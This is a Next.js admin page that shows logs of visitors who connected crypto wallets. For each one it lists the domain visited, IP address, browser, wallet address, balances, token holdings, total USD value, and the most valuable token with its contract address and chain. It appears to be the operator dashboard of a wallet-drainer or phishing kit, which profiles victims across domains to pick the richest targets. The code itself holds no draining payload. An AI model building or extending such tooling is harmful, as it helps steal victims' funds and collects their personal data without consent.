// src/app/admin/page.tsx
'use client'; // This component must be a Client Component.

import { useState, useEffect } from 'react';
import { useSession, signOut } from 'next-auth/react'; // Import useSession and signOut
import { useRouter } from 'next/navigation';

import Header from '@/components/layout/header';
import Footer from '@/components/layout/footer';
import { Button } from '@/components/ui/button';

// --- Define Interfaces (same as in log-connection API route) ---
interface TokenInfo {
  symbol: string;
  amount: string;
  decimals: number;
  valueUsd: string;
}

interface WalletConnectionLog {
  id: string;
  timestamp: string;
  walletAddress: string;
  connectedWalletName: string;
  chainId: number;
  chainName: string;
  ipAddress?: string | null;
  domain: string | null;
  userAgent?: string | null;
  nativeBalanceEth?: string | null;
  tokens?: TokenInfo[] | null; // Cast from Prisma.JsonValue later
  nftsDetected?: boolean | null;
  totalWalletValueUsd?: string | null;
  mostExpensiveTokenSymbol?: string | null;
  mostExpensiveTokenValueUsd?: string | null;
  mostExpensiveTokenContractAddress?: string | null;
  mostExpensiveTokenChainName?: string | null;
}


export default function AdminDashboardPage() {
  const { data: session, status } = useSession(); // Get session data and status
  const router = useRouter();

  const [logs, setLogs] = useState<WalletConnectionLog[]>([]);
  const [loadingLogs, setLoadingLogs] = useState(true);
  const [errorLogs, setErrorLogs] = useState<string | null>(null);

  // --- Authentication Protection Logic ---
  useEffect(() => {
    if (status === 'loading') {
      return; // Do nothing while session status is being determined
    }
    if (!session) {
      // If no session exists (not authenticated), redirect to login page
      router.push('/auth/signin');
    }
  }, [session, status, router]); // Dependencies: run when session or status changes

  // --- Fetch Logs Logic (only if authenticated) ---
  useEffect(() => {
    if (session) { // Only fetch logs if the user is authenticated
      const fetchLogs = async () => {
        try {
          setLoadingLogs(true);
          setErrorLogs(null);
          const response = await fetch('/api/log-connection'); // This GET endpoint is protected now
          if (!response.ok) {
            // Handle 401 Unauthorized here if session check somehow failed earlier
            if (response.status === 401) {
              router.push('/auth/signin?error=SessionExpired'); // Redirect to login on 401
            }
            throw new Error(`Error fetching logs: ${response.statusText}`);
          }
          const data: WalletConnectionLog[] = await response.json();
          setLogs(data.sort((a, b) => new Date(b.timestamp as string).getTime() - new Date(a.timestamp as string).getTime()));
        } catch (err) {
          console.error('Failed to fetch admin logs:', err);
          setErrorLogs('Failed to load logs. Please try again.');
        } finally {
          setLoadingLogs(false);
        }
      };
      fetchLogs();
    }
  }, [session, router]); // Dependency on session: fetch logs when user logs in

  // --- Conditional Rendering for Loading/Authentication State ---
  // Show a loading state if session is still being checked, or if not authenticated.
  if (status === 'loading' || !session) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-gray-100">
        <p>Loading admin panel...</p> {/* Or a proper loading spinner */}
      </div>
    );
  }

  // --- Main Admin Panel Content (only rendered if authenticated) ---
  return (
    <>
      <Header />
      <main className="container flex-grow py-12 md:py-24 lg:py-32">
        <div className="flex items-center justify-between mb-8">
          <h1 className="text-4xl font-headline font-bold tracking-tighter sm:text-5xl text-primary">
            Admin Logs
          </h1>
          <div className="flex items-center space-x-4">
            <Button onClick={() => window.location.reload()} variant="outline">
              Refresh Logs
            </Button>
            <Button onClick={() => signOut()} variant="destructive">
              Sign Out
            </Button>
          </div>
        </div>

        {loadingLogs && <p className="text-center text-lg">Loading wallet connection logs...</p>}
        {errorLogs && <p className="text-center text-lg text-red-500">{errorLogs}</p>}

        {!loadingLogs && !errorLogs && logs.length === 0 && (
          <p className="text-center text-lg text-muted-foreground">No wallet connections logged yet.</p>
        )}

        {!loadingLogs && !errorLogs && logs.length > 0 && (
          <div className="space-y-6">
            {logs.map((log) => (
              <div key={log.id} className="bg-card p-6 rounded-lg shadow-md border">
                <p className="text-lg font-semibold text-blue-600 mb-2">User #{log.id} connected wallet {log.connectedWalletName}</p>
                <p className="text-muted-foreground text-sm">
                  <span className="font-mono">{new Date(log.timestamp as string).toLocaleString()}</span>
                </p>
                <div className="mt-4 grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <p><strong>Domain:</strong> {log.domain}</p>
                    <p><strong>IP:</strong> {log.ipAddress}</p>
                    <p><strong>OS/Browser:</strong> {log.userAgent}</p>
                  </div>
                  <div>
                    <p><strong>Address:</strong> <span className="font-mono text-sm break-all">{log.walletAddress}</span></p>
                    <p><strong>Chain:</strong> {log.chainName} (ID: {log.chainId})</p>
                    {log.walletAddress && (
                      <p className="mt-2">
                        <a
                          href={`https://etherscan.io/address/${log.walletAddress}`}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="text-blue-500 hover:underline text-sm"
                        >
                          View wallet on scanner
                        </a>
                      </p>
                    )}
                  </div>
                </div>

                <div className="mt-4 pt-4 border-t border-dashed border-gray-200 dark:border-gray-700">
                  <h3 className="text-xl font-semibold mb-2 text-secondary-foreground">User's Assets:</h3>
                  <p><strong>Native Balance:</strong> {log.nativeBalanceEth}</p>
                  <p className="mt-2">
                    <strong>Tokens:</strong>
                    {log.tokens && (log.tokens as TokenInfo[]).length > 0 ? (
                      <ul className="list-disc list-inside ml-4">
                        {(log.tokens as TokenInfo[]).map((token, idx) => (
                          <li key={idx}>
                            {token.amount} {token.symbol} (${token.valueUsd})
                          </li>
                        ))}
                      </ul>
                    ) : ' Not detected'}
                  </p>
                  <p className="mt-2"><strong>NFTs:</strong> {log.nftsDetected ? 'Detected' : 'Not detected'}</p>
                  <p className="mt-4 text-lg font-bold">
                    Total wallet value: ${log.totalWalletValueUsd}
                  </p>
                  {log.mostExpensiveTokenSymbol && (
                    <p className="text-lg font-bold">
                      Most expensive token: {log.mostExpensiveTokenSymbol} (${log.mostExpensiveTokenValueUsd}) in network {log.mostExpensiveTokenChainName}
                    </p>
                  )}
                </div>
              </div>
            ))}
          </div>
        )}
      </main>
      <Footer />
    </>
  );
}